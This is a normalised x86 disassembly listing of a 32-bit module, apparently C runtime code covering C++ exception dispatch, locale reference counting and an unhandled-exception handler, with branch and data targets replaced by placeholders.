mov edi [ ebp + 0x8 ]
push edi
call sub_1002444c
add esp 0x10
dec eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10028b8d
retn
push 0x1
lea eax [ esi + 0x8 ]
push eax
push [ edi + 0x18 ]
call sub_100241b0
pop ecx
pop ecx
push eax
push [ esi + 0x18 ]
push ebx
call sub_10023a7f
jmp r-xdata
sub_1002465d
mov edi edi
push ebp
mov ebp esp
cmp [ ebp + 0x18 ] 0x0
je r-xdata
cmp [ ebp + 0x20 ] 0x0
push [ ebp + 0x8 ]
jne r-xdata
push [ ebp + 0x18 ]
push ebx
push esi
push [ ebp + 0x8 ]
call sub_100245cb
add esp 0x10
push [ ebp + 0x20 ]
push esi
jmp r-xdata
pop ebp
retn
push esi
push eax
call sub_10023a4d
call sub_10023a86
push [ edi ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
call sub_10024035
mov eax [ edi + 0x4 ]
push 0x100
push [ ebp + 0x1c ]
inc eax
push [ ebp + 0x14 ]
mov [ esi + 0x8 ] eax
push [ ebp + 0xc ]
mov ecx [ ebx + 0xc ]
push esi
push [ ebp + 0x8 ]
call sub_100242b0
add esp 0x28
test eax eax
je r-xdata
sub_100246cb
mov edi edi
push ebp
mov ebp esp
push ecx
push ecx
push esi
mov esi [ ebp + 0x8 ]
cmp [ esi ] 0x80000003
je r-xdata
pop esi
leave
retn
push edi
call sub_10027e84
cmp [ eax + 0x80 ] 0x0
je r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jne r-xdata
call sub_10027e84
lea edi [ eax + 0x80 ]
call sub_10027c2f
cmp [ edi ] eax
je r-xdata
mov esi [ ebp + 0x1c ]
lea eax [ ebp - 0x8 ]
push eax
lea eax [ ebp - 0x4 ]
push eax
push esi
push [ ebp + 0x20 ]
push edi
call sub_10023cb9
mov edi eax
mov eax [ ebp - 0x4 ]
add esp 0x14
cmp eax [ ebp - 0x8 ]
jae r-xdata
call sub_1002d639
cmp [ esi ] 0xe0434f4d
je r-xdata
pop edi
push ebx
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_10023b43
add esp 0x1c
test eax eax
jne r-xdata
inc [ ebp - 0x4 ]
mov eax [ ebp - 0x4 ]
add edi 0x14
cmp eax [ ebp - 0x8 ]
jb r-xdata
cmp esi [ edi + 0x4 ]
jg r-xdata
cmp esi [ edi ]
jl r-xdata
pop ebx
mov eax [ edi + 0xc ]
mov ecx [ edi + 0x10 ]
shl eax 0x4
add eax ecx
mov ecx [ eax - 0xc ]
test ecx ecx
je r-xdata
lea ebx [ eax - 0x10 ]
test [ ebx ] 0x40
jne r-xdata
cmp [ ecx + 0x8 ] 0x0
jne r-xdata
push [ ebp + 0x24 ]
mov esi [ ebp + 0xc ]
push [ ebp + 0x20 ]
push 0x0
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0x8 ]
call sub_1002465d
mov esi [ ebp + 0x1c ]
add esp 0x1c
sub_100247bf
mov edi edi
push ebp
mov ebp esp
sub esp 0x2c
mov ecx [ ebp + 0xc ]
push ebx
mov ebx [ ebp + 0x18 ]
mov eax [ ebx + 0x4 ]
cmp eax 0x80
push esi
push edi
mov [ ebp - 0x1 ] 0x0
jg r-xdata
mov ecx [ ecx + 0x8 ]
movsx ecx [ ecx + 0x8 ]
jmp r-xdata
call sub_1002d639
cmp ecx eax
jl r-xdata
cmp ecx 0xffffffff
mov [ ebp - 0x8 ] ecx
jl r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
cmp [ esi ] edi
jne r-xdata
cmp [ ebx + 0xc ] 0x0
jbe r-xdata
cmp [ esi + 0x10 ] 0x3
mov ebx 0x19930520
jne r-xdata
call sub_10027e84
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
cmp [ esi ] edi
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
pop edi
pop esi
pop ebx
leave
retn
call sub_1002d639
call sub_1002d5ed
push [ ebp + 0x24 ]
push [ ebp + 0x20 ]
push [ ebp - 0x8 ]
push ebx
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push esi
call sub_100246cb
add esp 0x20
mov ebx [ ebp + 0x18 ]
cmp [ esi + 0x10 ] 0x3
jne r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
call sub_10027e84
cmp [ eax + 0x88 ] 0x0
je r-xdata
cmp eax 0x19930522
jne r-xdata
mov edi [ ebp + 0x18 ]
cmp [ edi + 0xc ] 0x0
jbe r-xdata
cmp eax 0x19930521
je r-xdata
call sub_10027e84
mov esi [ eax + 0x88 ]
mov [ ebp + 0x8 ] esi
call sub_10027e84
mov eax [ eax + 0x8c ]
push 0x1
push esi
mov [ ebp + 0x10 ] eax
call sub_1002d96c
pop ecx
pop ecx
test eax eax
jne r-xdata
cmp [ ebp + 0x1c ] 0x0
je r-xdata
lea eax [ ebp - 0x1c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
push [ ebp - 0x8 ]
push [ ebp + 0x20 ]
push edi
call sub_10023cb9
add esp 0x14
mov edi eax
cmp eax 0x19930522
jne r-xdata
cmp [ esi ] edi
jne r-xdata
call sub_1002d639
cmp [ ebp - 0x1 ] 0x0
jne r-xdata
push 0x1
push esi
call sub_1002415b
pop ecx
pop ecx
mov edi [ ebp + 0x18 ]
mov eax [ ebp - 0x8 ]
cmp [ edi ] eax
jg r-xdata
call sub_10027e84
cmp [ eax + 0x94 ] 0x0
je r-xdata
cmp [ esi + 0x10 ] 0x3
jne r-xdata
mov eax [ edi ]
and eax 0x1fffffff
cmp eax 0x19930521
jb r-xdata
inc [ ebp - 0x10 ]
add edi 0x14
jmp r-xdata
cmp eax [ edi + 0x4 ]
jg r-xdata
call sub_10027e84
mov edi [ eax + 0x94 ]
call sub_10027e84
push [ ebp + 0x8 ]
xor esi esi
mov [ eax + 0x94 ] esi
call sub_100241ec
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x14 ]
cmp eax ebx
je r-xdata
mov edi [ edi + 0x1c ]
test edi edi
je r-xdata
mov eax [ ebp - 0x10 ]
cmp eax [ ebp - 0x1c ]
jae r-xdata
mov eax [ edi + 0x10 ]
mov [ ebp - 0xc ] eax
mov eax [ edi + 0xc ]
mov [ ebp - 0x18 ] eax
test eax eax
jle r-xdata
mov esi [ ebp + 0x8 ]
mov edi 0xe06d7363
xor ebx ebx
cmp [ edi ] ebx
jle r-xdata
cmp [ esi + 0x1c ] 0x0
jne r-xdata
cmp eax 0x19930521
je r-xdata
push esi
call sub_100241ec
pop ecx
test al al
jne r-xdata
mov eax [ esi + 0x1c ]
mov eax [ eax + 0xc ]
lea ebx [ eax + 0x4 ]
mov eax [ eax ]
mov [ ebp - 0x14 ] eax
test eax eax
jle r-xdata
mov eax [ edi + 0x4 ]
mov ecx [ ebx + eax + 0x4 ]
push rw-data
call sub_100203ab
test al al
jne r-xdata
call sub_1002d639
cmp eax 0x19930522
jne r-xdata
call sub_10027e84
call sub_10027e84
call sub_10027e84
mov [ eax + 0x88 ] esi
call sub_10027e84
cmp [ ebp + 0x24 ] 0x0
mov ecx [ ebp + 0x10 ]
mov [ eax + 0x8c ] ecx
push esi
jne r-xdata
dec [ ebp - 0x18 ]
add [ ebp - 0xc ] 0x10
cmp [ ebp - 0x18 ] 0x0
jg r-xdata
push [ esi + 0x1c ]
mov eax [ ebx ]
push eax
push [ ebp - 0xc ]
mov [ ebp - 0x20 ] eax
call sub_10023f8d
add esp 0xc
test eax eax
jne r-xdata
push 0x1
push [ ebp + 0x8 ]
call sub_1002415b
pop ecx
pop ecx
push r--data
lea ecx [ ebp - 0x2c ]
call sub_10023f3d
push r--data
lea eax [ ebp - 0x2c ]
push eax
call sub_10023a01
inc esi
add ebx 0x10
cmp esi [ edi ]
jl r-xdata
push [ ebp + 0x24 ]
push [ ebp + 0xc ]
jmp r-xdata
jmp r-xdata
push [ ebp + 0x24 ]
mov ebx [ ebp - 0xc ]
push [ ebp + 0x20 ]
mov [ ebp - 0x1 ] 0x1
push [ ebp - 0x20 ]
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push esi
mov esi [ ebp + 0xc ]
call sub_1002465d
mov esi [ ebp + 0x8 ]
add esp 0x1c
dec [ ebp - 0x14 ]
add ebx 0x4
cmp [ ebp - 0x14 ] eax
jg r-xdata
call sub_10023a86
mov esi [ ebp + 0x18 ]
push 0xffffffff
push esi
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10024035
add esp 0x10
push [ esi + 0x1c ]
call sub_10024267
sub_10024b23
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
call sub_10027e84
cmp [ eax + 0x20c ] 0x0
mov eax [ ebp + 0x18 ]
mov ecx [ ebp + 0x8 ]
mov edi 0xe06d7363
mov esi 0x1fffffff
mov ebx 0x19930522
jne r-xdata
test [ ecx + 0x4 ] 0x66
je r-xdata
mov edx [ ecx ]
cmp edx edi
je r-xdata
cmp [ eax + 0xc ] 0x0
jne r-xdata
cmp [ eax + 0x4 ] 0x0
je r-xdata
cmp edx 0x80000026
je r-xdata
cmp [ ecx ] edi
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx 0x19930521
jb r-xdata
xor eax eax
inc eax
cmp [ ebp + 0x1c ] 0x0
jne r-xdata
mov edx [ eax ]
and edx esi
cmp edx ebx
jb r-xdata
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push [ ebp + 0x24 ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call sub_100247bf
add esp 0x20
cmp [ ecx + 0x10 ] 0x3
jb r-xdata
cmp [ eax + 0x1c ] 0x0
je r-xdata
push 0xffffffff
push eax
push [ ebp + 0x14 ]
push [ ebp + 0xc ]
call sub_10024035
add esp 0x10
jmp r-xdata
test [ eax + 0x20 ] 0x1
jne r-xdata
cmp [ ecx + 0x14 ] ebx
jbe r-xdata
mov edx [ ecx + 0x1c ]
mov edx [ edx + 0x8 ]
test edx edx
je r-xdata
movzx esi [ ebp + 0x24 ]
push esi
push [ ebp + 0x20 ]
push [ ebp + 0x1c ]
push eax
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push ecx
call edx
add esp 0x20
jmp r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
sub_10024c09
mov edi edi
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
push [ rw-data ]
call sub_10027c38
push [ rw-data ]
mov edi eax
mov [ ebp - 0x4 ] edi
call sub_10027c38
mov esi eax
pop ecx
pop ecx
cmp esi edi
jb r-xdata
xor eax eax
mov ebx esi
sub ebx edi
lea eax [ ebx + 0x4 ]
cmp eax 0x4
jb r-xdata
push edi
call sub_1002d97e
mov edi eax
lea eax [ ebx + 0x4 ]
pop ecx
cmp edi eax
jae r-xdata
push [ ebp + 0x8 ]
call sub_10027bbd
mov [ esi ] eax
add esi 0x4
push esi
call sub_10027bbd
pop ecx
mov [ rw-data ] eax
mov eax [ ebp + 0x8 ]
pop ecx
jmp r-xdata
mov eax 0x800
cmp edi eax
jae r-xdata
pop edi
pop esi
pop ebx
leave
retn
add eax edi
cmp eax edi
jb r-xdata
mov eax edi
lea eax [ edi + 0x10 ]
cmp eax edi
jb r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10026d36
pop ecx
pop ecx
test eax eax
jne r-xdata
push eax
push [ ebp - 0x4 ]
call sub_10026d36
pop ecx
pop ecx
test eax eax
je r-xdata
sar ebx 0x2
push eax
lea esi [ eax + ebx * 4 ]
call sub_10027bbd
pop ecx
mov [ rw-data ] eax
sub_10024cc3
mov edi edi
push esi
push 0x4
push 0x20
call sub_10026cea
mov esi eax
push esi
call sub_10027bbd
add esp 0xc
mov [ rw-data ] eax
mov [ rw-data ] eax
test esi esi
jne r-xdata
and [ esi ] 0x0
xor eax eax
pop esi
retn
push 0x18
pop eax
pop esi
retn
sub_10024cf4
push 0xc
push r--data
call sub_10028b48
call sub_10023774
and [ ebp - 0x4 ] 0x0
push [ ebp + 0x8 ]
call sub_10024c09
pop ecx
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10024d2a
mov eax [ ebp - 0x1c ]
call sub_10028b8d
retn
sub_10024d47
mov edi edi
push ebp
mov ebp esp
sub esp 0x10
push [ ebp + 0x8 ]
lea ecx [ ebp - 0x10 ]
call sub_10023358
cmp [ ebp + 0x14 ] 0xffffffff
jge r-xdata
push [ ebp + 0x18 ]
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
call [ GetStringTypeW@IAT ]
xor eax eax
jmp r-xdata
leave
retn
mov ecx [ ebp - 0x8 ]
and [ ecx + 0x70 ] 0xfffffffd
cmp [ ebp - 0x4 ] 0x0
je r-xdata
sub_10024d85
mov edi edi
push ebp
mov ebp esp
sub esp 0x328
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
test [ rw-data ] 0x1
push esi
je r-xdata
call sub_1002d6d7
test eax eax
je r-xdata
push 0xa
call sub_1002aae0
pop ecx
test [ rw-data ] 0x2
je r-xdata
push 0x16
call sub_1002d6e4
pop ecx
push 0x3
call sub_1002398e
int3
mov [ ebp - 0x220 ] eax
mov [ ebp - 0x224 ] ecx
mov [ ebp - 0x228 ] edx
mov [ ebp - 0x22c ] ebx
mov [ ebp - 0x230 ] esi
mov [ ebp - 0x234 ] edi
mov [ ebp - 0x208 ] ss
mov [ ebp - 0x214 ] cs
mov [ ebp - 0x238 ] ds
mov [ ebp - 0x23c ] es
mov [ ebp - 0x240 ] fs
mov [ ebp - 0x244 ] gs
pushfd
pop [ ebp - 0x210 ]
mov esi [ ebp + 0x4 ]
lea eax [ ebp + 0x4 ]
mov [ ebp - 0x20c ] eax
mov [ ebp - 0x2d0 ] 0x10001
mov [ ebp - 0x218 ] esi
mov eax [ eax - 0x4 ]
push 0x50
mov [ ebp - 0x21c ] eax
lea eax [ ebp - 0x328 ]
push 0x0
push eax
call sub_100209e0
lea eax [ ebp - 0x328 ]
add esp 0xc
mov [ ebp - 0x2d8 ] eax
lea eax [ ebp - 0x2d0 ]
push 0x0
mov [ ebp - 0x328 ] 0x40000015
mov [ ebp - 0x31c ] esi
mov [ ebp - 0x2d4 ] eax
call [ SetUnhandledExceptionFilter@IAT ]
lea eax [ ebp - 0x2d8 ]
push eax
call [ UnhandledExceptionFilter@IAT ]
sub_10024e9c
mov edi edi
push ebp
mov ebp esp
mov ecx [ ebp + 0xc ]
mov eax [ rw-data ]
mov edx [ ebp + 0x8 ]
and edx [ ebp + 0xc ]
not ecx
and ecx eax
or ecx edx
mov [ rw-data ] ecx
pop ebp
retn
sub_10024ebd
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x8 ]
mov eax [ esi + 0xbc ]
xor ebx ebx
push edi
cmp eax ebx
je r-xdata
mov eax [ esi + 0xc0 ]
cmp eax ebx
je r-xdata
cmp eax rw-data
je r-xdata
lea edi [ esi + 0xd4 ]
mov eax [ edi ]
cmp eax rw-data
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb0 ]
cmp eax ebx
je r-xdata
lea edi [ esi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
cmp [ eax + 0xb4 ] ebx
jne r-xdata
mov eax [ esi + 0xc4 ]
sub eax 0xfe
push eax
call sub_100207fd
mov eax [ esi + 0xcc ]
mov edi 0x80
sub eax edi
push eax
call sub_100207fd
mov eax [ esi + 0xd0 ]
sub eax edi
push eax
call sub_100207fd
push [ esi + 0xc0 ]
call sub_100207fd
add esp 0x10
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x4 ] ebx
je r-xdata
mov eax [ edi ]
cmp eax ebx
je r-xdata
push eax
call sub_1002de3c
push [ edi ]
call sub_100207fd
pop ecx
pop ecx
mov eax [ esi + 0xb8 ]
cmp eax ebx
je r-xdata
add edi 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ edi + 0x4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
mov eax [ esi + 0xb4 ]
cmp eax ebx
je r-xdata
cmp [ eax ] ebx
jne r-xdata
cmp [ edi - 0x8 ] rw-data
je r-xdata
push esi
call sub_100207fd
pop ecx
pop edi
pop esi
pop ebx
pop ebp
retn
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100207fd
pop ecx
push [ esi + 0xb0 ]
call sub_100207fd
push [ esi + 0xbc ]
call sub_100207fd
pop ecx
pop ecx
cmp [ eax ] ebx
jne r-xdata
push eax
call sub_100207fd
push [ esi + 0xbc ]
call sub_1002e259
pop ecx
pop ecx
push eax
call sub_100207fd
pop ecx
push eax
call sub_100207fd
push [ esi + 0xbc ]
call sub_1002e04a
pop ecx
pop ecx
sub_10025006
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ InterlockedIncrement@IAT ]
push edi
mov edi [ ebp + 0x8 ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop edi
pop esi
pop ebx
pop ebp
retn
push eax
call esi
sub_10025095
mov edi edi
push ebp
mov ebp esp
push edi
mov edi [ ebp + 0x8 ]
test edi edi
je r-xdata
mov eax edi
pop edi
pop ebp
retn
push ebx
push esi
mov esi [ InterlockedDecrement@IAT ]
push edi
call esi
mov eax [ edi + 0xb0 ]
test eax eax
je r-xdata
mov eax [ edi + 0xb8 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xb4 ]
test eax eax
je r-xdata
push eax
call esi
mov eax [ edi + 0xc0 ]
test eax eax
je r-xdata
push eax
call esi
lea ebx [ edi + 0x50 ]
mov [ ebp + 0x8 ] 0x6
push eax
call esi
cmp [ ebx - 0x4 ] 0x0
je r-xdata
mov eax [ ebx ]
test eax eax
je r-xdata
add ebx 0x10
dec [ ebp + 0x8 ]
jne r-xdata
mov eax [ ebx + 0x4 ]
test eax eax
je r-xdata
push eax
call esi
cmp [ ebx - 0x8 ] rw-data
je r-xdata
mov eax [ edi + 0xd4 ]
add eax 0xb4
push eax
call esi
pop esi
pop ebx
push eax
call esi
sub_1002512e
mov edi edi
push esi
mov esi ecx
test esi esi
je r-xdata
pop esi
retn
test eax eax
je r-xdata
cmp eax esi
je r-xdata
push edi
push 0x36
pop ecx
mov edi eax
[ edi ] [ esi ]
and [ eax ] 0x0
push eax
call sub_10025006
pop ecx
pop edi
sub_10025154
test edi edi
je r-xdata
xor eax eax
retn
test eax eax
je r-xdata
push esi
mov esi [ eax ]
cmp esi edi
je r-xdata
mov eax edi
pop esi
retn
push edi
mov [ eax ] edi
call sub_10025006
pop ecx
test esi esi
je r-xdata
push esi
call sub_10025095
cmp [ esi ] 0x0
pop ecx
jne r-xdata
cmp esi rw-data
je r-xdata
push esi
call sub_10024ebd
pop ecx
sub_10025192
push 0xc
push r--data
call sub_10028b48
call sub_10027e84
mov esi eax
mov eax [ rw-data ]
test [ esi + 0x70 ] eax
je r-xdata
push 0xc
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
lea eax [ esi + 0x6c ]
mov edi [ rw-data ]
call sub_10025154
mov [ ebp - 0x1c ] eax
mov [ ebp - 0x4 ] 0xfffffffe
call sub_100251fc
jmp r-xdata
cmp [ esi + 0x6c ] 0x0
je r-xdata
test esi esi
jne r-xdata
call sub_10027e84
mov esi [ eax + 0x6c ]
mov eax esi
call sub_10028b8d
retn
push 0x20
call sub_10023708
pop ecx
sub_10025208
mov eax [ rw-data ]
mov ecx [ eax + 0x4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0x8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xa8 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xd4 ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xbc ]
mov [ rw-data ] ecx
mov ecx [ eax + 0xc8 ]
mov [ rw-data ] ecx
mov eax [ eax + 0xac ]
mov [ rw-data ] eax
retn
sub_1002525b
push 0x8
push r--data
call sub_10028b48
mov esi [ ebp + 0x8 ]
test esi esi
je r-xdata
call sub_10028b8d
retn
push 0xd
call sub_10028f4e
pop ecx
and [ ebp - 0x4 ] 0x0
mov eax [ esi + 0x4 ]
test eax eax
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10025308
cmp [ esi ] 0x0
je r-xdata
push eax
call [ InterlockedDecrement@IAT ]
test eax eax
jne r-xdata
mov eax 0xbaadf00d
mov [ esi ] eax
mov [ esi + 0x4 ] eax
push esi
call sub_100207fd
pop ecx
push 0xc
call sub_10028f4e
pop ecx
mov [ ebp - 0x4 ] 0x1
push [ esi ]
call sub_10025095
pop ecx
mov eax [ esi ]
test eax eax
je r-xdata
mov eax [ esi + 0x4 ]
cmp eax rw-data
je r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
call sub_10025314
cmp [ eax ] 0x0
jne r-xdata
push eax
call sub_100207fd
pop ecx
cmp eax rw-data
je r-xdata
push eax
call sub_10024ebd
pop ecx
sub_1002531d
mov edi edi
push ebp
mov ebp esp
push ebx
push edi
mov edi [ ebp + 0x10 ]
xor ebx ebx
cmp edi ebx
jle r-xdata
pop edi
pop ebx
pop ebp
retn
push esi
lea esi [ ebp + 0x10 ]
dec edi
jne r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
add esi 0x4
push [ esi ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002f5c7
add esp 0xc
test eax eax
je r-xdata
pop esi
sub_1002535d
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
push edi
mov edi [ ebp + 0x8 ]
push 0x90
xor ebx ebx
push ebx
push edi
call sub_100209e0
mov esi [ ebp + 0xc ]
mov al [ esi ]
add esp 0xc
test al al
jne r-xdata
cmp al 0x2e
jne r-xdata
xor eax eax
jmp r-xdata
push r--data
push esi
mov [ ebp + 0xc ] ebx
call sub_10020980
cmp eax ebx
jmp r-xdata
lea eax [ esi + 0x1 ]
cmp [ eax ] bl
je r-xdata
pop edi
pop esi
pop ebx
pop ebp
retn
pop ecx
pop ecx
jne r-xdata
push 0xf
push eax
lea eax [ edi + 0x80 ]
push 0x10
push eax
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
cmp [ ebp + 0xc ] 0x0
lea edi [ eax + esi ]
mov bl [ edi ]
jne r-xdata
or eax 0xffffffff
mov [ edi + 0x8f ] bl
jmp r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
cmp [ ebp + 0xc ] 0x1
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp [ ebp + 0xc ] 0x2
jne r-xdata
cmp eax 0x40
jae r-xdata
cmp bl 0x2e
je r-xdata
cmp eax 0x10
jae r-xdata
cmp bl 0x5f
je r-xdata
push eax
push esi
push 0x40
push [ ebp + 0x8 ]
jmp r-xdata
test bl bl
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x40
add eax 0x40
jmp r-xdata
call sub_1002f63b
add esp 0x10
test eax eax
je r-xdata
push eax
mov eax [ ebp + 0x8 ]
push esi
push 0x10
sub eax 0xffffff80
cmp bl 0x2c
jne r-xdata
push eax
cmp bl 0x2c
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
test bl bl
je r-xdata
inc [ ebp + 0xc ]
lea esi [ edi + 0x1 ]
push r--data
push esi
call sub_10020980
test eax eax
sub_10025486
mov edi edi
push ebp
mov ebp esp
push ebx
push esi
mov esi [ ebp + 0x10 ]
push esi
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002776c
add esp 0xc
xor ebx ebx
test eax eax
je r-xdata
lea eax [ esi + 0x40 ]
cmp [ eax ] bl
je r-xdata
push ebx
push ebx
push ebx
push ebx
push ebx
call sub_10020451
add esp 0x14
lea eax [ esi + 0x80 ]
cmp [ eax ] bl
pop esi
pop ebx
je r-xdata
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002531d
add esp 0x14
pop ebp
retn
push eax
push r--data
push 0x2
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1002531d
add esp 0x14
sub_100254f3
mov edi edi
push ebp
mov ebp esp
sub esp 0x14
push ebx
xor ebx ebx
inc ebx
push 0x355
mov [ ebp - 0x10 ] ebx
call sub_10026ca5
pop ecx
mov [ ebp - 0x14 ] eax
test eax eax
je r-xdata
pop ebx
leave
retn
push edi
lea edi [ eax + 0x4 ]
mov [ edi ] 0x0
mov [ eax ] ebx
mov [ ebp - 0x8 ] ebx
lea ebx [ esi + 0x10 ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
push r--data
push [ r--data ]
push 0x3
push 0x351
push edi
call sub_1002531d
mov eax [ ebp - 0xc ]
add esp 0x18
mov [ ebp - 0xc ] eax
mov [ ebp - 0x4 ] r--data
push [ ebx + 0x58 ]
mov eax [ ebp - 0xc ]
push [ eax ]
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
xor eax eax
push eax
push eax
push eax
push eax
push eax
call sub_10020451
add esp 0x14
inc [ ebp - 0x8 ]
mov eax [ ebp - 0x8 ]
add [ ebp - 0x4 ] 0xc
shl eax 0x4
lea ebx [ eax + esi ]
lea eax [ ebx + 0x48 ]
push [ eax ]
mov [ ebp - 0xc ] eax
mov eax [ ebp - 0x4 ]
push r--data
push [ eax ]
push 0x3
push 0x351
push edi
call sub_1002531d
add esp 0x18
cmp [ ebp - 0x4 ] r--data
jl r-xdata
and [ ebp - 0x10 ] 0x0
push r--data
push 0x351
push edi
call sub_1002f5c7
add esp 0xc
test eax eax
je r-xdata
cmp [ ebp - 0x10 ] 0x0
jne r-xdata
push [ ebp - 0x14 ]
call sub_100207fd
mov eax [ esi + 0x50 ]
mov edi [ InterlockedDecrement@IAT ]
xor ebx ebx
pop ecx
cmp eax ebx
je r-xdata
mov eax [ esi + 0x50 ]
mov ebx [ InterlockedDecrement@IAT ]
test eax eax
je r-xdata
mov eax [ esi + 0x54 ]
cmp eax ebx
je r-xdata
push eax
call edi
test eax eax
jne r-xdata
mov eax [ esi + 0x54 ]
test eax eax
je r-xdata
push eax
call ebx
test eax eax
jne r-xdata
mov eax [ esi + 0x68 ]
mov [ esi + 0x54 ] ebx
mov [ esi + 0x4c ] ebx
mov [ esi + 0x50 ] ebx
mov [ esi + 0x48 ] ebx
push eax
call edi
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_100207fd
pop ecx
mov eax [ ebp - 0x14 ]
and [ esi + 0x54 ] 0x0
and [ esi + 0x4c ] 0x0
mov [ esi + 0x50 ] eax
mov [ esi + 0x48 ] edi
mov eax edi
jmp r-xdata
push eax
call ebx
test eax eax
jne r-xdata
push [ esi + 0x50 ]
call sub_100207fd
pop ecx
push [ esi + 0x54 ]
call sub_100207fd
pop ecx
pop edi
push [ esi + 0x54 ]
call sub_100207fd
pop ecx
sub_10025670
mov edi edi
push ebp
mov ebp esp
sub esp 0xb4
mov eax [ rw-data ]
xor eax ebp
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0xc ]
push ebx
push esi
mov esi [ ebp + 0x8 ]
push edi
mov edi [ ebp + 0x14 ]
mov [ ebp - 0x9c ] eax
mov eax [ ebp + 0x18 ]
mov [ ebp - 0xa4 ] edi
mov [ ebp - 0xa0 ] eax
call sub_10027e84
add eax 0x9c
lea ecx [ eax + 0x28 ]
mov [ ebp - 0xac ] ecx
lea ecx [ eax + 0x2c ]
lea ebx [ eax + 0x20 ]
add eax 0xaf
mov [ ebp - 0xa8 ] ecx
mov [ ebp - 0x98 ] eax
test esi esi
je r-xdata
xor eax eax
cmp [ ebp - 0x9c ] 0x0
je r-xdata
cmp [ ebp + 0x10 ] 0x0
je r-xdata
cmp [ esi ] 0x43
jne r-xdata
push esi
call sub_100200e0
mov edi 0x83
pop ecx
mov [ ebp - 0xb0 ] eax
cmp eax edi
jae r-xdata
cmp [ esi + 0x1 ] 0x0
jne r-xdata
and [ ebp - 0xb4 ] 0x0
lea eax [ ebp - 0x94 ]
push esi
push eax
call sub_1002535d
pop ecx
pop ecx
test eax eax
jne r-xdata
push esi
push [ ebp - 0x98 ]
call sub_100232d0
pop ecx
pop ecx
test eax eax
je r-xdata
push r--data
push [ ebp + 0x10 ]
push [ ebp - 0x9c ]
call sub_1002776c
add esp 0xc
xor esi esi
test eax eax
je r-xdata
lea eax [ ebp - 0x94 ]
push eax
